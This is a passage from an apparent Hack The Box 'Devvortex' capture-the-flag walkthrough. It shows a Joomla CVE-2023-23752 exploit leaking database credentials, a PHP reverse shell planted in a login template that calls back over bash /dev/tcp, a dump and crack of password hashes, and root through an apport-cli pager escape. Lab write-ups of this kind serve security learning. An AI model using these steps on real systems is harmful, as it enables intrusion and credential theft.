</code></pre></div></div> <p>Navigating to the subdomain reveals another landing page.</p> <p><img src="/assets/img/20240115-devvortext-cover-landingpage2.png" alt="20240115-devvortext-cover-landingpage2.png" class="auto-resize"/></p> <h2 id="subdomain-directory-scanning">Subdomain directory scanning</h2> <p>The newly identified subdomain <code class="language-plaintext highlighter-rouge">dev.devvortex.htb</code> can be fuzzed again for pages.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt <span class="nt">-u</span> http://dev.devvortex.htb/FUZZ <span class="nt">-t</span> 200 <span class="nt">--hc</span> 404,403 <span class="o">&gt;</span> subdomain-directory-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <h3 id="findings-2">Findings</h3> <p>The fuzzing revealed a number of directories on the subdomain. Lets start with the <code class="language-plaintext highlighter-rouge">administrator</code> directory.</p> <p><img src="/assets/img/20240115-devvortext-domainfuzzing.png" alt="20240115-devvortext-domainfuzzing.png" class="auto-resize"/></p> <p>Navigating to the <code class="language-plaintext highlighter-rouge">/administrator</code> page reveals a <strong>Joomla</strong> landing page.</p> <p><img src="/assets/img/20240115-devvortext-joomlapage.png" alt="20240115-devvortext-joomlapage.png" class="auto-resize"/></p> <h3 id="what-is-joomla">What is Joomla</h3> <p>Joomla is a popular, open-source Content Management System (CMS) used to build, manage, and publish content for websites, blogs, and online applications. It is written in PHP and uses a <strong>MySQL</strong> database to store content and settings.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="joomla-compromise">Joomla compromise</h2> <p>Checking the subdomain’s README.txt file reveals the Joomla version as 4.2.</p> <p>A quick search of <code class="language-plaintext highlighter-rouge">searchsploit</code> and we find a promising exploit.</p> <p><img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize"/></p> <p>Using the <code class="language-plaintext highlighter-rouge">mirror</code> command the exploit can be copied to a working directory.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/51334.py
</code></pre></div></div> <p>This exploit ran into some library issues so another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752</p> <p>The exploit executed successfully and identified two users, site details and database information including credentials.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ./CVE-2023-23752 http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

</code></pre></div></div> <p>Password stuffing Lewis’ credentials on the <code class="language-plaintext highlighter-rouge">/administrator</code> page resulted in a successful authentication.</p> <p>Checking SSH with Lewis’ credentials revealed no further credential re-use.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>ssh lewis@10.129.15.24        
lewis@10.129.15.24<span class="s1">'s password: 
Permission denied, please try again.
lewis@10.129.15.24'</span>s password: 
</code></pre></div></div> <h2 id="foothold---php-reverse-shell">Foothold - PHP reverse shell</h2> <p>On the admin panel is a warning about the server using an outdated version of PHP.</p> <p><img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize"/></p> <p>Moving to <code class="language-plaintext highlighter-rouge">/System/Templates/Administrator Templates</code>, it was identified that the user has access to the PHP templates. The <code class="language-plaintext highlighter-rouge">login.php</code> was edited to send a reverse shell when the page is served.</p> <p>The modification made was:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 00&gt;&amp;1"'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">system()</code> <em>Function in PHP</em>: This is a PHP function that is used to execute an external program. The <code class="language-plaintext highlighter-rouge">system</code> function will execute the given command and output the result. In this context, it is being used to execute a bash command.</li> <li><code class="language-plaintext highlighter-rouge">bash -c</code>: This tells the system to execute the following string with Bash.</li> <li><code class="language-plaintext highlighter-rouge">"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 0&lt;&amp;1"</code>: This is the string command that Bash executes.</li> <li><code class="language-plaintext highlighter-rouge">bash -i</code>: This starts an interactive Bash shell (<code class="language-plaintext highlighter-rouge">-i</code> flag for interactive).</li> <li><code class="language-plaintext highlighter-rouge">&gt;&amp; /dev/tcp/10.10.14.16/4321</code>: This redirects the standard output (stdout) of the shell to a TCP connection to the specified IP address and port.</li> <li><code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code>: This part redirects the standard input (stdin) to the shell from the same TCP connection. The <code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code> means to take input (file descriptor 0) from the same place as the standard output (file descriptor 1).</li> </ul> <blockquote> <p><em>The <code class="language-plaintext highlighter-rouge">&gt;&amp;</code> operator is shorthand for redirecting both stdout (1) and stderr (2).</em></p> </blockquote> <p><img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize"/></p> <p>Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4321
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.15.24] 45554
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>856<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@devvortex:~/dev.devvortex.htb/administrator<span class="nv">$ </span>

</code></pre></div></div> <h3 id="shell-stabilisation">Shell stabilisation</h3> <p>Now the shell can be stabilised before proceeding.</p> <p><img src="/assets/img/20240115-devvortext-shellupgrade.png" alt="20240115-devvortext-shellupgrade.png" class="auto-resize"/></p> <p>As shown above, running these commands sequentially, and then hitting enter a few times, will return a more interactive and stable shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>  
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm  
ctrl + z  
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div> <p>The sequence of commands will upgrade a basic shell into a fully interactive shell. This is often necessary because simple reverse shells can be quite limited (e.g., no tab completion, no interactive commands). Here’s a brief explanation of each step:</p> <ol> <li><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>: <ul> <li>This command uses Python to spawn a new bash shell with pseudo-terminal (pty) support. This improves the shell’s interactivity and handling of certain commands.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code>: <ul> <li>After the Python command gives you a more functional shell, set the <code class="language-plaintext highlighter-rouge">TERM</code> environment variable to <code class="language-plaintext highlighter-rouge">xterm</code>. This tells the shell what kind of terminal it’s running in, allowing for better formatting and functionality (like clear screen, command history).</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">Ctrl + Z</code>: <ul> <li>This key combination suspends the current foreground process (the shell), returning control to your local terminal without closing the shell.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>: <ul> <li><code class="language-plaintext highlighter-rouge">stty raw -echo</code>: This configures the terminal. <code class="language-plaintext highlighter-rouge">raw</code> mode means input characters are passed to the foreground process immediately, and <code class="language-plaintext highlighter-rouge">-echo</code> turns off input echoing, preventing characters from being displayed twice.</li> <li><code class="language-plaintext highlighter-rouge">fg</code>: This command brings the suspended process (your bash shell) back to the foreground.</li> </ul> </li> <li><strong>Hit Enter a Few Times</strong>: <ul> <li>Sometimes, after running these commands, you might need to hit enter a few times to get the prompt of the interactive shell.</li> </ul> </li> </ol> <h2 id="lateral-movement---mysql">Lateral movement - MySQL</h2> <p>Recall the credentials found with the Joomla exploit earlier:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
</code></pre></div></div> <p>Trying them on the reverse shell is successful.</p> <pre><code class="language-mysql">mysql -h localhost -u lewis -p '&lt;REDACTED&gt;'
</code></pre> <pre><code class="language-mysql">www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8889
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;  
+-------------------------------+  
| Tables_in_joomla |  
+-------------------------------+  
| sd4fg_action_log_config |  
| sd4fg_action_logs |  
| sd4fg_action_logs_extensions |  
| sd4fg_action_logs_users |  
| sd4fg_assets |  
| sd4fg_associations |  
| sd4fg_banner_clients |  
| sd4fg_banner_tracks |
&lt;SNIP&gt;
| sd4fg_users |

mysql&gt; select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | &lt;REDACTED&gt; | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | &lt;REDACTED&gt; | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

</code></pre> <p>As shown above, two hashes were stolen from the database.</p> <p><img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize"/></p> <h2 id="cracking-the-passwords">Cracking the passwords</h2> <p>Using Hashcat, one of the hashes is quickly cracked.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/credentials]
└─<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hashes /usr/share/wordlists/rockyou.txt       
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
&lt;SNIP&gt;
&lt;REDACTED&gt;

</code></pre></div></div> <p>This hash corresponds to the user <code class="language-plaintext highlighter-rouge">logan</code>.</p> <h2 id="ssh">SSH</h2> <p>Trying the password on SSH is successful.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ ssh logan@10.129.15.24
logan@10.129.15.24's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Jan 2024 06:46:03 AM UTC

  System load:           0.0
  Usage of /:            64.2% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             177
  Users logged in:       0
  IPv4 address for eth0: 10.129.15.24
  IPv6 address for eth0: dead:beef::250:56ff:fe96:b12d

  =&gt; There are 8 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ 

</code></pre></div></div> <p>Grab the first flag!</p> <p><img src="/assets/img/20240115-devvortext-userflag.png" alt="20240115-devvortext-userflag.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> lists the binaries <code class="language-plaintext highlighter-rouge">logan</code> can run with root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>logan@devvortex:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>logan on devvortex:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User logan may run the following commands on devvortex:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/apport-cli

</code></pre></div></div> <p>We can see here that <code class="language-plaintext highlighter-rouge">logan</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/apport-cli</code>.</p> <h2 id="what-is-apport-cli">What is apport-cli</h2> <p><code class="language-plaintext highlighter-rouge">apport-cli</code> is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.</p> <p>A key feature of the utility is a <strong>Command-Line Interface</strong>. As a CLI tool, <code class="language-plaintext highlighter-rouge">apport-cli</code> allows users to interact with the Apport crash reporting system directly from the terminal. This is particularly useful for servers or other systems where a graphical user interface (GUI) is not available.</p> <h2 id="exploiting-apport-cli">Exploiting apport-cli</h2> <p>The help menu reveals a number of options.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: apport-cli <span class="o">[</span>options] <span class="o">[</span>symptom|pid|package|program path|.apport/.crash file]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-f</span>, <span class="nt">--file-bug</span>        Start <span class="k">in </span>bug filing mode. Requires <span class="nt">--package</span> and an
                        optional <span class="nt">--pid</span>, or just a <span class="nt">--pid</span><span class="nb">.</span> If neither is given,
                        display a list of known symptoms. <span class="o">(</span>Implied <span class="k">if </span>a single
                        argument is given.<span class="o">)</span>
  <span class="nt">-w</span>, <span class="nt">--window</span>          Click a window as a target <span class="k">for </span>filing a problem
                        report.
  <span class="nt">-u</span> UPDATE_REPORT, <span class="nt">--update-bug</span><span class="o">=</span>UPDATE_REPORT
                        Start <span class="k">in </span>bug updating mode. Can take an optional
                        <span class="nt">--package</span><span class="nb">.</span>
  <span class="nt">-s</span> SYMPTOM, <span class="nt">--symptom</span><span class="o">=</span>SYMPTOM
                        File a bug report about a symptom. <span class="o">(</span>Implied <span class="k">if </span>symptom
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-p</span> PACKAGE, <span class="nt">--package</span><span class="o">=</span>PACKAGE
                        Specify package name <span class="k">in</span> <span class="nt">--file-bug</span> mode. This is
                        optional <span class="k">if </span>a <span class="nt">--pid</span> is specified. <span class="o">(</span>Implied <span class="k">if </span>package
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-P</span> PID, <span class="nt">--pid</span><span class="o">=</span>PID     Specify a running program <span class="k">in</span> <span class="nt">--file-bug</span> mode. If this
                        is specified, the bug report will contain more
                        information.  <span class="o">(</span>Implied <span class="k">if </span>pid is given as only
                        argument.<span class="o">)</span>
  <span class="nt">--hanging</span>             The provided pid is a hanging application.
  <span class="nt">-c</span> PATH, <span class="nt">--crash-file</span><span class="o">=</span>PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones <span class="k">in</span> /var/crash. <span class="o">(</span>Implied <span class="k">if
                        </span>file is given as only argument.<span class="o">)</span>
  <span class="nt">--save</span><span class="o">=</span>PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        <span class="k">then </span>be reported later on from a different machine.
  <span class="nt">--tag</span><span class="o">=</span>TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  <span class="nt">-v</span>, <span class="nt">--version</span>         Print the Apport version number.

</code></pre></div></div> <p>With <code class="language-plaintext highlighter-rouge">sudo /usr/bin/apport-cli -f</code> the utility enters the <strong>File a bug</strong> mode to first attempt submitting a bug to understand how the utility works.</p> <p>At the end, of the submission is an option to view the report.</p> <p><img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize"/></p> <p>The screen that follows opens in a <code class="language-plaintext highlighter-rouge">vim</code> style editor.</p> <p><img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize"/></p> <p>Passing a shell to it by typing <code class="language-plaintext highlighter-rouge">!/bin/bash</code> may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.</p> <p>and it does!</p> <p><img src="/assets/img/20240115-devvortext-rootflag.png" alt="20240115-devvortext-rootflag.png" class="auto-resize"/></p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="credential-stuffing"/><category term="information-disclosure"/><category term="password-cracking"/><summary type="html"><![CDATA[Devvortex - Hack The Box walkthrough.]]></summary></entry></feed>